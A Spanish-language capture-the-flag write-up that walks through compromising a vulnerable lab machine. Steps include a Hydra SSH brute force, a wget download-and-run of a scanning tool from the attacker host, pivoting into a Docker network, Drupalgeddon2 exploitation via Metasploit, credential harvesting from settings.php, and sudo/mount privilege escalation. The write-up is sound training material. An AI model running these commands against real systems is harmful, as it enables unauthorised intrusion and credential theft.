# 🎩 Pa Que Aiga Lujo - Writeup Completo

![The Hackers Labs](https://img.shields.io/badge/Platform-The%20Hackers%20Labs-blueviolet?style=for-the-badge)
![Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)

> Una máquina que combina reconocimiento web, fuerza bruta, pivoting por Docker y escalada de privilegios. ¡Un verdadero lujo de pentesting!

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Tecnologías Utilizadas](#tecnologías-utilizadas)
- [Fase 1: Reconocimiento](#fase-1-reconocimiento)
- [Fase 2: Acceso Inicial](#fase-2-acceso-inicial)
- [Fase 3: Pivoting Interno](#fase-3-pivoting-interno)
- [Fase 4: Explotación Docker](#fase-4-explotación-docker)
- [Fase 5: Escalada Final](#fase-5-escalada-final)
- [Flags](#flags)

---

## 🎯 Descripción

**Pa Que Aiga Lujo** es una máquina vulnerable de The Hackers Labs que simula un entorno empresarial con múltiples capas de seguridad. El objetivo es comprometer el sistema completo mediante:

1. **Enumeración web** para extraer nombres de usuarios
2. **Ataque de fuerza bruta SSH** con Hydra
3. **Descubrimiento de redes internas** (Docker)
4. **Explotación de Drupal 8** (CVE-2018-7600)
5. **Escalada de privilegios** mediante configuraciones inseguras de sudo

---

## 🛠️ Tecnologías Utilizadas

| Herramienta | Uso |
|---|---|
| **Netdiscover** | Descubrimiento de hosts en la red |
| **Nmap** | Escaneo de puertos y servicios |
| **Hydra** | Ataque de fuerza bruta SSH |
| **fscan** | Escaneo interno de la red Docker |
| **SSH Port Forwarding** | Pivoting a redes internas |
| **Metasploit** | Explotación de Drupalgeddon2 |
| **GTFOBins** | Escalada de privilegios via mount |

---

## 🔍 Fase 1: Reconocimiento

### Descubrimiento de Hosts

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

**Resultado:** IP víctima identificada: `10.0.4.91`

### Escaneo de Puertos

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.91
nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.91
```

**Puertos Abiertos:**
- **Puerto 22** → OpenSSH 9.2p1 (Debian)
- **Puerto 80** → Apache 2.4.62 (Tienda de artículos de lujo)

### Enumeración Web

Accediendo a `http://10.0.4.91`, encontramos una tienda llamada **LuxeCollection**. Del análisis del contenido extraemos posibles usuarios:

```
Carlos, Isabella, Alexandre, Miguel, Elena, Sophia, Victoria, 
Anastasia, Roberto, James, Catherine, Margot, Valentina, Priscilla, Beatrice
```

---

## 🔓 Fase 2: Acceso Inicial

### Ataque de Fuerza Bruta SSH

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.4.91 -t 64
```

✅ **Credenciales encontradas:**
```
Usuario: Sophia
Contraseña: dolphins
```

### Acceso al Sistema

```bash
ssh Sophia@10.0.4.91
```

---

## 🌐 Fase 3: Pivoting Interno

### Enumeración de Interfaces

```bash
ip a
```

**Descubrimiento:** Interfaz `docker0` con IP `172.17.0.1` → Indica contenedores activos

### Ping Sweep en Subred Docker

```bash
for i in {1..254} ;do (ping -c 1 172.17.0.$i | grep "bytes from" &) ;done
```

**Host activo encontrado:** `172.17.0.2`

### Transferencia de Herramientas

```bash
# En máquina atacante
python3 -m http.server 80

# En máquina víctima
wget http://10.0.4.12/fscan
chmod +x fscan
./fscan -h 172.17.0.2
```

**Resultado:** Drupal 8 vulnerable a **CVE-2018-7600** (Drupalgeddon2)

---

## 💣 Fase 4: Explotación Docker

### Port Forwarding SSH

```bash
ssh -L 8080:172.17.0.2:80 Sophia@10.0.4.91
```

### Explotación con Metasploit

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS localhost
set RPORT 8080
run
```

✅ **Shell obtenida:** `www-data` en el contenedor

### Movimiento Lateral

Buscando credenciales en Drupal:

```bash
grep -r "password" /var/www/html/sites/default/settings.php
```

**Contraseña encontrada:** `ballenitafeliz` (usuario: `ballenita`)

```bash
su ballenita
```

### Escalada en Contenedor

```bash
sudo -l
# Output: ballenita puede ejecutar /bin/ls y /bin/grep como root sin contraseña
```

Lectura de archivo secreto:

```bash
sudo -u root /bin/grep '' /root/secretitomaximo.txt
# Output: ElcipotedeChocolate-CipotitoCipoton
```

---

## 👑 Fase 5: Escalada Final

### Acceso como cipote

```bash
ssh cipote@10.0.4.91
# Contraseña: ElcipotedeChocolate-CipotitoCipoton
```

### Escalada a root

```bash
sudo -l
# Output: cipote puede ejecutar /usr/bin/mount como root sin contraseña
```

**Explotación vía GTFOBins:**

```bash
sudo /usr/bin/mount -o bind /bin/bash /bin/mount
sudo mount
# ¡Shell de root obtenida!
```

---

## 🚩 Flags

### User Flag
```
f3e431cd1xxxxxxxxxxfcb2cc151e8
```

### Root Flag
```
92f0383bbaxxxxxxd3087dc4636978
```

---

## 📚 Lecciones Aprendidas

| Concepto | Lección |
|---|---|
| **Enumeración Web** | Extraer información de aplicaciones públicas es crucial |
| **Diccionarios Personalizados** | Mejorar wordlists con datos del objetivo |
| **Pivoting** | Docker expone redes internas explotables |
| **Configuración Insegura** | Permisos sudo mal configurados son críticos |
| **Port Forwarding** | Técnica esencial para acceder a servicios internos |

---

## ⚠️ Notas de Seguridad

- Nunca reutilizar contraseñas entre sistemas
- Auditar permisos sudo regularmente
- Aislar contenedores Docker adecuadamente
- Mantener software actualizado (Drupal, OpenSSH)
- Implementar WAF y IDS

---

**Creado para fines educativos en ciberseguridad** 🎓
